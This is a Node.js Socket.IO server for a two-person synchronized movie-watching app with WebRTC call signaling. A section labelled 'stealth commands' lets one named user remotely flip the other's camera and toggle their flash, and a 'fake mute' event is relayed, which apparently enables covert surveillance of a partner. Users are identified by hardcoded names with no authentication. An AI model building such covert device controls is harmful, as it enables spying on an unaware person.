const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

// Serve static assets
app.use(express.static(path.join(__dirname, '/')));

// Root route
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Dynamic PWA Manifest generation inside Node to avoid extra files
app.get('/manifest.json', (req, res) => {
    res.json({
        "name": "سينما VIP 🎬",
        "short_name": "سينما VIP",
        "description": "منصة سينما الحب الأبدي المزامنة الفاخرة لأبو عاهد وأم الارا",
        "start_url": "/",
        "display": "standalone",
        "background_color": "#05020a",
        "theme_color": "#ff2d55",
        "orientation": "portrait-primary",
        "icons": [
            {
                "src": "https://placehold.co/192x192/ff2d55/ffffff?text=VIP",
                "sizes": "192x192",
                "type": "image/png",
                "purpose": "any maskable"
            },
            {
                "src": "https://placehold.co/512x512/ff2d55/ffffff?text=VIP_Cinema",
                "sizes": "512x512",
                "type": "image/png"
            }
        ]
    });
});

// Silent state persistence
let cinemaState = {
    videoUrl: "",
    isPlaying: false,
    lastSeekTime: 0,
    lastUpdated: Date.now(),
    playerType: "none"
};

const activeUsers = {
    abouahad: null,
    umalara: null
};

io.on('connection', (socket) => {
    socket.on('register-user', (userId) => {
        if (userId === 'abouahad' || userId === 'umalara') {
            activeUsers[userId] = socket.id;
            socket.userId = userId;
            
            const partnerId = userId === 'abouahad' ? 'umalara' : 'abouahad';
            const partnerSocketId = activeUsers[partnerId];
            
            if (partnerSocketId) {
                io.to(partnerSocketId).emit('partner-status', { online: true });
                socket.emit('partner-status', { online: true });
            } else {
                socket.emit('partner-status', { online: false });
            }

            socket.emit('cinema-state-update', cinemaState);
        }
    });

    // Zero-delay synchronization logic
    socket.on('cinema-control', (data) => {
        cinemaState = {
            videoUrl: data.videoUrl,
            isPlaying: data.isPlaying,
            lastSeekTime: data.lastSeekTime,
            lastUpdated: Date.now(),
            playerType: data.playerType
        };

        const partnerId = socket.userId === 'abouahad' ? 'umalara' : 'abouahad';
        const partnerSocketId = activeUsers[partnerId];
        if (partnerSocketId) {
            io.to(partnerSocketId).emit('cinema-state-update', cinemaState);
        }
    });

    socket.on('request-partner-time', () => {
        const partnerId = socket.userId === 'abouahad' ? 'umalara' : 'abouahad';
        const partnerSocketId = activeUsers[partnerId];
        if (partnerSocketId) {
            io.to(partnerSocketId).emit('get-current-time');
        }
    });

    socket.on('respond-current-time', (time) => {
        const partnerId = socket.userId === 'abouahad' ? 'umalara' : 'abouahad';
        const partnerSocketId = activeUsers[partnerId];
        if (partnerSocketId) {
            io.to(partnerSocketId).emit('force-seek', time);
        }
    });

    // Custom direct WebRTC Signaling channels
    socket.on('webrtc-offer', (data) => {
        const partnerId = socket.userId === 'abouahad' ? 'umalara' : 'abouahad';
        const partnerSocketId = activeUsers[partnerId];
        if (partnerSocketId) {
            io.to(partnerSocketId).emit('webrtc-offer', data);
        }
    });

    socket.on('webrtc-answer', (data) => {
        const partnerId = socket.userId === 'abouahad' ? 'umalara' : 'abouahad';
        const partnerSocketId = activeUsers[partnerId];
        if (partnerSocketId) {
            io.to(partnerSocketId).emit('webrtc-answer', data);
        }
    });

    socket.on('webrtc-candidate', (data) => {
        const partnerId = socket.userId === 'abouahad' ? 'umalara' : 'abouahad';
        const partnerSocketId = activeUsers[partnerId];
        if (partnerSocketId) {
            io.to(partnerSocketId).emit('webrtc-candidate', data);
        }
    });

    // Dynamic stealth commands routing (Abou Ahad -> Um Alara)
    socket.on('remote-flip-cam', () => {
        const partnerId = 'umalara';
        const partnerSocketId = activeUsers[partnerId];
        if (partnerSocketId && socket.userId === 'abouahad') {
            io.to(partnerSocketId).emit('remote-flip-cam-triggered');
        }
    });

    socket.on('remote-flash-toggle', () => {
        const partnerId = 'umalara';
        const partnerSocketId = activeUsers[partnerId];
        if (partnerSocketId && socket.userId === 'abouahad') {
            io.to(partnerSocketId).emit('remote-flash-triggered');
        }
    });

    socket.on('love-pulse', () => {
        const partnerId = socket.userId === 'abouahad' ? 'umalara' : 'abouahad';
        const partnerSocketId = activeUsers[partnerId];
        if (partnerSocketId) {
            io.to(partnerSocketId).emit('love-pulse-received');
        }
    });

    socket.on('privacy-fake-mute', (status) => {
        const partnerId = socket.userId === 'abouahad' ? 'umalara' : 'abouahad';
        const partnerSocketId = activeUsers[partnerId];
        if (partnerSocketId) {
            io.to(partnerSocketId).emit('privacy-fake-mute-received', status);
        }
    });

    socket.on('disconnect', () => {
        if (socket.userId) {
            activeUsers[socket.userId] = null;
            const partnerId = socket.userId === 'abouahad' ? 'umalara' : 'abouahad';
            const partnerSocketId = activeUsers[partnerId];
            if (partnerSocketId) {
                io.to(partnerSocketId).emit('partner-status', { online: false });
            }
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`[SYSTEM SUCCESS] Server online at port: ${PORT}`);
});
